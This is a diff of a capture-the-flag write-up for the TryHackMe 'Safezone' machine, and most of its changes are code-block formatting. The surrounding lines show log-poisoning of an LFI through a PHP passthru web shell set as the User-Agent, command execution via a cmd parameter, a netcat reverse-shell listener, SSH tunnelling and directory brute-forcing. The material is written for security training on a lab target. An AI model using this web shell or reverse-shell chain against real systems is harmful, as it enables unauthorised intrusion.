@@ -8,7 +8,8 @@ We first place safezone.thm in the /etc/hosts file. Its standard practice on Try
 
 From here we start start our standard enumeration beginning with nmap.
 
-```root@ip-10-10-213-155:~# nmap -sC -sT -O -vv safezone.thm
+```
+root@ip-10-10-213-155:~# nmap -sC -sT -O -vv safezone.thm
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-29 16:02 BST
 [SNIP]
@@ -192,7 +193,7 @@ http://safezone.thm/detail.php?page=/var/log/apache2/access.log
 ![image](https://user-images.githubusercontent.com/73745039/113362385-2e607800-9346-11eb-9bc9-b71f302f0b89.png)
 
 Bingo! So now to poison the cache we start up burpsuit, reload the page and catch it in BURP. We replace our user-agent to:
-```<?php passthru($_REQUEST['cmd']); ?>```
+	<?php passthru($_REQUEST['cmd']); ?>
 And when we send our next request we've just injected PHP code into the cache, which will be ran when we next reload the page with any command in the new cmd parameter.
 
 We start up our own terminal and listen for pings with:
@@ -205,7 +206,8 @@ http://safezone.thm/detail.php?page=/var/log/apache2/access.log&cmd=ping -c 5 [A
 
 We get confirmation we've got code execution by being pinged. We then just run a reverse shell annnnd:
 
-```root@ip-10-10-213-155:~/lfi-fuzz# nc -nvlp 4242
+```
+root@ip-10-10-213-155:~/lfi-fuzz# nc -nvlp 4242
 Listening on [0.0.0.0] (family 0, port 4242)
 Connection from 10.10.160.123 37880 received!
 /bin/sh: 0: can't access tty; job control turned off
@@ -253,7 +255,8 @@ files@safezone:/var$
 
 As the user "files" we can find a suspicious file in their home directory. It looks like a hash of their password.
 
-```files@safezone:~$ ls -al
+```
+files@safezone:~$ ls -al
 total 44
 drwxrwxrwx 5 files files 4096 Mar 30 00:25  .
 drwxr-xr-x 4 root  root  4096 Jan 29 12:30  ..
@@ -306,7 +309,8 @@ ssh -L 2222:127.0.0.1:8000 files@safezone.thm
 
 And well, here we go again!
 
-```root@ip-10-10-213-155:~# gobuster dir -u http://127.0.0.1:2222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
+```
+root@ip-10-10-213-155:~# gobuster dir -u http://127.0.0.1:2222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
